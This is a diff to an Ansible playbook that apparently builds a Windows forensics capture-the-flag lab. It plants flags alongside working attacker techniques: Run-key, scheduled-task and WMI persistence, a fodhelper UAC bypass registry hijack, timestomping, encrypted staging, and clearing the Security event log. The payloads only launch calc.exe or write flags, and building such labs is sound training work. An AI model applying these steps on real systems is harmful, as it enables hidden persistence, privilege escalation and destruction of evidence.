@@ -170,3 +170,133 @@
         change: Everyone
         read: Everyone
         state: present
+
+    - name: Add Run key persistence launching calc.exe on logon (T1547.001)
+      ansible.windows.win_regedit:
+        path: HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+        name: CTF{P3r5i5t3nc3_v14_Run_K3y5}
+        data: calc.exe
+        type: string
+        state: present
+
+    - name: Plant initial foothold flag on LocalAdmin Desktop
+      ansible.windows.win_copy:
+        content: "CTF{1n1t14l_F00th0ld_0n_wvvm}\n"
+        dest: C:\Users\LocalAdmin\Desktop\initial_foothold_flag.txt
+
+    - name: Ensure attacker staging directory exists
+      ansible.windows.win_file:
+        path: C:\ProgramData\svc
+        state: directory
+
+    - name: Drop benign investigation note (host for ADS)
+      ansible.windows.win_copy:
+        content: "Investigation notes for wvvm case #2026-07-INTR.\n"
+        dest: C:\Investigation\notes.txt
+
+    - name: Hide flag in Alternate Data Stream (T1564.004)
+      ansible.windows.win_shell: |
+        Set-Content -Path 'C:\Investigation\notes.txt' -Stream 'hidden' -Value 'CTF{H1dd3n_1n_Alt3rn4t3_D4t4_Str34m}'
+      changed_when: false
+
+    - name: Create scheduled task persistence (T1053.005)
+      community.windows.win_scheduled_task:
+        name: GoogleUpdaterCore
+        description: "Google Updater Core - CTF{Sch3dul3d_T4sk_P3rs1st3nc3}"
+        actions:
+          - path: cmd.exe
+            arguments: /c calc.exe
+        triggers:
+          - type: logon
+        username: SYSTEM
+        run_level: highest
+        state: present
+        enabled: true
+
+    - name: Establish WMI Event Subscription persistence (T1546.003)
+      ansible.windows.win_shell: |
+        $filterName = 'FIN7SysDrainFilter'
+        $consumerName = 'CTF{WMI_3v3nt_Subscr1pt10n_C4rb4n4k}'
+        $existing = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$filterName'" -ErrorAction SilentlyContinue
+        if (-not $existing) {
+          $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
+            Name = $filterName
+            EventNamespace = 'root\cimv2'
+            QueryLanguage = 'WQL'
+            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+          }
+          $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
+            Name = $consumerName
+            CommandLineTemplate = 'C:\Windows\System32\calc.exe'
+          }
+          Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
+            Filter = $filter
+            Consumer = $consumer
+          }
+        }
+      changed_when: false
+
+    - name: Plant UAC bypass hijack via fodhelper (T1548.002)
+      ansible.windows.win_regedit:
+        path: HKCU:\Software\Classes\ms-settings\Shell\Open\command
+        name: "{{ item.name }}"
+        data: "{{ item.data }}"
+        type: string
+        state: present
+      loop:
+        - { name: "(Default)", data: "cmd.exe /c echo CTF{UAC_Byp4ss_v14_f0dh3lp3r} > C:\\Users\\Public\\uac_bypass.txt" }
+        - { name: DelegateExecute, data: "" }
+
+    - name: Drop timestomped loader stub (T1070.006)
+      ansible.windows.win_shell: |
+        $target = 'C:\ProgramData\svc\svcupdater.exe'
+        Set-Content -Path $target -Value 'FIN7 loader stub - flag: CTF{T1m3st0mp3d_MFT_M1sm4tch}' -Encoding ASCII
+        $stampDate = [DateTime]'2020-01-15 03:14:15'
+        $f = Get-Item $target
+        $f.CreationTime   = $stampDate
+        $f.LastWriteTime  = $stampDate
+        $f.LastAccessTime = $stampDate
+      changed_when: false
+
+    - name: Install 7-Zip for encrypted staging
+      chocolatey.chocolatey.win_chocolatey:
+        name: 7zip
+        state: present
+
+    - name: Prepare decoy document for staging
+      ansible.windows.win_copy:
+        content: |
+          Confidential Corporate Data
+          ---------------------------
+          Flag: CTF{Ex71ltr4t10n_St4g3d_H3r3}
+        dest: C:\ProgramData\svc\_stage_decoy.txt
+
+    - name: Build password-protected staged archive (T1074.001, T1560.001)
+      ansible.windows.win_shell: |
+        $sevenZip = 'C:\Program Files\7-Zip\7z.exe'
+        if (Test-Path 'C:\ProgramData\svc\stage.7z') { Remove-Item 'C:\ProgramData\svc\stage.7z' -Force }
+        & $sevenZip a -p'CTF{P4ssw0rd_Pr0t3ct3d_4rch1v3}' -mhe=on 'C:\ProgramData\svc\stage.7z' 'C:\ProgramData\svc\_stage_decoy.txt' | Out-Null
+        Remove-Item 'C:\ProgramData\svc\_stage_decoy.txt' -Force
+      changed_when: false
+
+    - name: Drop fake Seatbelt binary and execute to seed Prefetch (T1082/T1087)
+      ansible.windows.win_shell: |
+        Copy-Item -Path 'C:\Windows\System32\whoami.exe' -Destination 'C:\ProgramData\svc\Seatbelt.exe' -Force
+        & 'C:\ProgramData\svc\Seatbelt.exe' /all 2>&1 | Out-File 'C:\ProgramData\svc\seatbelt_out.txt' -Encoding utf8
+        Add-Content -Path 'C:\ProgramData\svc\seatbelt_out.txt' -Value 'CTF{S34tb3lt_Pr3f3tch_D1sc0v3ry}'
+      changed_when: false
+
+    - name: Stop and disable Print Spooler as impact IOC (T1489)
+      ansible.windows.win_service:
+        name: Spooler
+        state: stopped
+        start_mode: disabled
+
+    - name: Drop log-clearing operator artifact
+      ansible.windows.win_copy:
+        content: "Operator cleared Security log during cleanup phase.\nFlag: CTF{Cl34r3d_S3cur1ty_L0g}\n"
+        dest: C:\Users\Public\log_cleared_by.txt
+
+    - name: Clear Security event log to erase attacker traces (T1070.001)
+      ansible.windows.win_shell: wevtutil cl Security
+      changed_when: false
